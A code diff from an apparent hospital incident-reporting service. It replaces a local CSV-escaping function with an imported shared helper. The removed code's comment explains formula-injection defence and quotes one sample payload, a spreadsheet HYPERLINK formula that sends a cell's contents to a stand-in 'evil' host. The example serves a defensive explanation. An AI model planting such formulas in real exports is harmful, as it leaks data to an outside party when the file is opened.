@@ -11,6 +11,7 @@ import { hasPermission, incidentScopeFilter } from '../../common/helpers/inciden
 import { canSeeReporterOf, REPORTER_CONFIDENTIAL_LABEL } from '../../common/helpers/reporterPrivacy.js';
 import { PERMISSIONS } from '../../common/enums/permissions.js';
 import { logActivity } from '../audit/audit.service.js';
+import { buildCsv } from '../../common/helpers/csv.js';
 
 // Registers for audits (NABH/JCI) and export. Rows are flat and include turnaround days,
 // so the on-screen table and the CSV export show exactly the same figures.
@@ -46,28 +47,6 @@ const endOfDay = (value: string) => {
   const d = new Date(value);
   d.setHours(23, 59, 59, 999);
   return d;
-};
-
-const escapeCsvField = (value: any): string => {
-  if (value === null || value === undefined) return '';
-  let str = String(value);
-  // Defuse CSV/formula injection (OWASP): several exported columns are free text a Staff or
-  // HOD user wrote (title, description, CAPA action, remarks). A leading =, +, -, @, tab or CR
-  // makes Excel/LibreOffice run the cell as a formula when the file is opened, so a report
-  // titled e.g. `=HYPERLINK("http://evil/steal?"&A1)` would execute for whoever opens the export.
-  if (/^[=+\-@\t\r]/.test(str)) {
-    str = `'${str}`;
-  }
-  if (/[",\r\n]/.test(str)) {
-    return `"${str.replace(/"/g, '""')}"`;
-  }
-  return str;
-};
-
-const buildCsv = (headers: string[], rows: any[][]): string => {
-  const headerLine = headers.map(escapeCsvField).join(',');
-  const rowLines = rows.map((r) => r.map(escapeCsvField).join(','));
-  return [headerLine, ...rowLines].join('\r\n');
 };
 
 export const getIncidentRegisterReport = async (req: Request, res: Response, next: NextFunction): Promise<void> => {
